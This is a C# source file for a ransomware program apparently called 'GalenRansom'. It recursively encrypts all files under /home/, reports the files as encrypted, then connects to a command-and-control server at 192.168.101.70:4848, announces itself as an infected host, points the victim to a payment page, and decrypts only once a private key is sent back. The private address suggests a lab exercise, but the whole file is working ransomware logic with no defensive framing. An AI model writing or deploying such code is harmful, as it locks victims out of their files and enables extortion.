using System;
using System.Net.Sockets;
using System.Text;

Encrypter encrypter = new Encrypter();
string exeDir = AppDomain.CurrentDomain.BaseDirectory;

int Spread(string startPath){
    if(startPath.Contains("GalenRansom")) return 0;
    string[] folders = Directory.GetDirectories(startPath);
    string[] files = Directory.GetFiles(startPath);

    foreach(string file in files)
    {
        if(file.EndsWith(".enc")) continue;          // skip already encrypted
        if(Path.GetDirectoryName(file) == exeDir.TrimEnd('/')) continue; // skip exe dir

        try
        {
            encrypter.Encrypt(file, file + ".enc");
        }
        catch (IOException ex)
        {
            Console.WriteLine($"Skipping {file} - in use: {ex.Message}");
        }
        catch (UnauthorizedAccessException ex)
        {
            Console.WriteLine($"Skipping {file} - no permission: {ex.Message}");
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Skipping {file} - error: {ex.Message}");
        }
    }

    foreach(string folder in folders)
    {
        Spread(folder);
    }
    return 0;
}

int Fix(string startPath, string privKeyPath){
    string[] folders = Directory.GetDirectories(startPath);
    string[] files = Directory.GetFiles(startPath);

    foreach(string file in files)
    {
        if(!file.EndsWith(".enc")) continue;
        if(Path.GetDirectoryName(file) == exeDir.TrimEnd('/')) continue;

        try
        {
            encrypter.Decrypt(file, file.Replace(".enc", ""), privKeyPath);
            File.Delete(file); // remove .enc after decrypting
        }
        catch (IOException ex)
        {
            Console.WriteLine($"Skipping {file} - in use: {ex.Message}");
        }
        catch (UnauthorizedAccessException ex)
        {
            Console.WriteLine($"Skipping {file} - no permission: {ex.Message}");
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Skipping {file} - error: {ex.Message}");
        }
    }

    foreach(string folder in folders)
    {
        Fix(folder, privKeyPath);
    }
    return 0;
}

// Entry point
Spread("/home/");
Console.WriteLine("Files encrypted!\nConnecting to C2...\n");

string privateKeyPath = Path.Combine(exeDir, "priv.pem");

// Connect to C2 and wait for key
try
{
    using TcpClient client = new TcpClient("192.168.101.70", 4848);
    using NetworkStream stream = client.GetStream();
    
    Console.WriteLine("Connected to C2. Waiting for payment confirmation...");
    Console.WriteLine("Go to http://192.168.101.70");
    // Tell C2 who we are
    byte[] hello = Encoding.UTF8.GetBytes("INFECTED_HOST");
    stream.Write(hello, 0, hello.Length);
    
    // Block here waiting for the private key to come back
    byte[] buffer = new byte[4096];
    StringBuilder keyBuilder = new StringBuilder();
    
    int bytesRead;
    while ((bytesRead = stream.Read(buffer, 0, buffer.Length)) > 0)
    {
        keyBuilder.Append(Encoding.UTF8.GetString(buffer, 0, bytesRead));
        // PEM keys end with this, so we know we have the full key
        if (keyBuilder.ToString().Contains("-----END"))
            break;
    }
    
    string privateKey = keyBuilder.ToString();
    Console.WriteLine("Key received! Decrypting...");
    
    // Save key to disk so Fix() can use it
    File.WriteAllText(privateKeyPath, privateKey);
}
catch (Exception ex)
{
    Console.WriteLine($"C2 connection failed: {ex.Message}");
    return;
}

Fix("/home/", privateKeyPath);

// Clean up key after use
if (File.Exists(privateKeyPath))
    File.Delete(privateKeyPath);

Console.WriteLine("Files decrypted successfully.");